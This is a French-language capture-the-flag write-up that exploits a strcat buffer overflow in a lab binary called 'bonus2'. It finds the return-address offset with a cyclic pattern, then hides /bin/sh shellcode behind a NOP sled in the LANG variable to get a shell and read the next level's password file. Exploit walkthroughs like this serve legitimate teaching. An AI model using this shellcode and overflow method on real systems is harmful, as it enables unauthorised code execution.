
### Bonus 2

#### Etape 01 : identification de la vulnérabilité

Il y a une faille évidente dans `greetuser()` : la fonction utilise `strcat` pour concaténer un nom fourni par l'utilisateur à l'un des préfixes suivants selon la locale :

- "Hyvää päivää "
- "Goedemiddag! "
- "Hello "

Le buffer `name` peut contenir un grand nombre d'octets (72 dans la logique du programme), en concaténant sans contrôle, on peut provoquer un overflow

ON va essayer de trouver l'offset d'écrasement pour "Hello", nous utilisons un pattern cyclique :

```bash
python -c "from pwn import *; print(cyclic(200).decode())"
```

```gdb
(gdb) r $(python -c 'print "A" * 40') (notre pattern)
Program received signal SIGSEGV, Segmentation fault.
0x08006161 in ?? ()
```

Avec le préfixe `Hello ` n'obtient pas d'offset exploitable on va tester avec les autres. En lisant le code nous voyons que le préfixe dépend de la variable d'environnement `LANG`. On change donc la locale pour tester `fi` :

```bash
export LANG=fi
```

```gdb
Program received signal SIGSEGV, Segmentation fault.
0x61666161 in ?? ()
```

On décode la valeur trouvée pour obtenir l'offset :

```bash
python -c "from pwn import *; print(cyclic_find(0x61666161))"
# => 18
```

L'offset d'écrasement est `18` octets.

#### Etape 02 : placement du shellcode et exploitation

Plutôt que d'essayer de deviner précisément l'adresse, on place un shellcode dans la variable d'environnement `LANG` (on préfixe par `fi` pour conserver le comportement du programme) et on ajoute un grand sled de NOPs pour faciliter l'atterrissage :

```bash
export LANG=$(python -c 'print("fi" + "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

`\x90` est un NOP (no-op) ; le NOP-sled permet de ne pas avoir à connaître l'adresse exacte du début du shellcode.

Dans `gdb` on place un breakpoint sur `main`, on exécute et on inspecte l'environnement pour trouver l'adresse du shellcode :

```gdb
(gdb) b main
(gdb) r eeee eeee
(gdb) x/500s environ
0xbffffd23: "LANG=fi\220\220\220..."
0xbffffdeb: "\220\220\220..."
```

On retient l'adresse repérée (ex. `0xbffffdeb`) et on construit l'adresse en little-endian pour l'injecter dans l'argument qui sera copié par `strcat`.

Exemple de commande d'exploitation (adresse little-endian `\xeb\xfd\xff\xbf`) :

```bash
./bonus2 $(python -c 'print "e" * 40') $(python -c 'print "e" * 18 + "\xeb\xfd\xff\xbf"')
```

Si tout se passe bien, on obtient un shell :

```bash
cat /home/user/bonus3/.pass
```
